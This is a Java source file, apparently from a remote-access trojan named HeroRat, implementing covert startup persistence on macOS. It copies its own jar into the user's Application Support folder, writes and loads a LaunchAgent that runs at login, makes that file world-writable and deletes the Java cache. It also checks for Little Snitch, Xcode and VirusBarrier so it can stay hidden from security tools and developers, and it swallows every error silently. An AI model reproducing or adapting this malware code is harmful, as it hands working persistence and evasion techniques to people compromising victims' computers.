package net.herorat.features.startup;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;

public class StartupMac
{
	private static final String HOME = System.getProperty("user.home");
	private static final String SUBFOLDER = "Library/Application Support";
	
	public static void add(String entry_name)
	{		
		try
		{
			File currentJar = new File(StartupMac.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			
			directoryInjection(entry_name, currentJar);
			autorunInjection(entry_name, currentJar);
			
			// Clear the java cache
			Runtime.getRuntime().exec(new String[] { "rm", "-rf", HOME + "/Library/Caches/Java/cache" }).waitFor();
		}
		catch (Exception e) {}
	}
	
	public static void remove(String entry_name)
	{
		try
		{
			File currentJar = new File(StartupMac.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			
			removeDirectory(entry_name, currentJar);
			removeAutorun(entry_name);
		}
		catch (Exception e) {}
	}
	
	private static void directoryInjection(String entry_name, File currentJar)
	{
		try
		{
			File outputJar = new File(HOME, SUBFOLDER + "/" + entry_name + "/" + currentJar.getName());

			InputStream in = new FileInputStream(currentJar);
			OutputStream out = new FileOutputStream(outputJar);
			
			byte[] buf = new byte[1024];
			int len;
			while ((len = in.read(buf)) > 0)
			{
				out.write(buf, 0, len);
			}
			in.close();
			out.close();
		}
		catch (Exception e) {}
	}
	
	private static void removeDirectory(String entry_name, File currentJar)
	{		
		File outputJar = new File(HOME, SUBFOLDER + "/" + entry_name + "/" + currentJar.getName());
		if (outputJar.exists()) outputJar.delete();
	}
	
	private static void autorunInjection(String entry_name, File currentJar)
	{
		try
		{
			File outputJar = new File(HOME, SUBFOLDER + "/" + entry_name + "/" + currentJar.getName());
			
			// We don't create the file is there is an AntiVirus
			if(!(new File("/Library/Little Snitch")).exists() && !(new File("/Developer/Applications/Xcode.app/Contents/MacOS/Xcode")).exists() && !(new File("/Applications/VirusBarrier X6.app")).exists())
			{
				// Get the system paths
				String fileSeparator = System.getProperty("file.separator");
				String startup_file = HOME + "/Library/LaunchAgents/" + entry_name + ".plist";
				
				// Generate the file content
				String data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
				data += "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n";
				data += "<plist version=\"1.0\">\n";
				data += "<dict>\n";
				data += "<key>Label</key>\n";
				data += "<string>" + entry_name + "</string>\n";
				data += "<key>ProgramArguments</key>\n";
				data += "<array>\n";
				data += "<string>" + HOME + fileSeparator + "bin" + fileSeparator + "java</string>\n";
				data += "<string>-jar</string>\n";
				data += "<string>" + outputJar.getAbsolutePath() + "</string>\n";
				data += "</array>\n";
				data += "<key>RunAtLoad</key>\n";
				data += "<true/>\n";
				data += "</dict>\n";
				data += "</plist>";
			   
				// Save the file
				FileWriter fstream = new FileWriter(startup_file);
				BufferedWriter out = new BufferedWriter(fstream);
				out.write(data);
				out.close();
				
				// Add the file to the startup list
				Runtime.getRuntime().exec(new String[] { "chmod", "777", startup_file }).waitFor();
				Runtime.getRuntime().exec(new String[] { "launchctl", "load", entry_name }).waitFor();
			}
		}
		catch (Exception e) {}
	}
	
	private static void removeAutorun(String entry_name)
	{
		try
		{
			// Remove from startup
			Runtime.getRuntime().exec(new String[] { "launchctl", "remove", entry_name }).waitFor();
			
			// Delete the config file
			File plist = new File(HOME, "/Library/LaunchAgents/" + entry_name + ".plist");
			if (plist.exists()) plist.delete();
		}
		catch (Exception e) {}
	}
}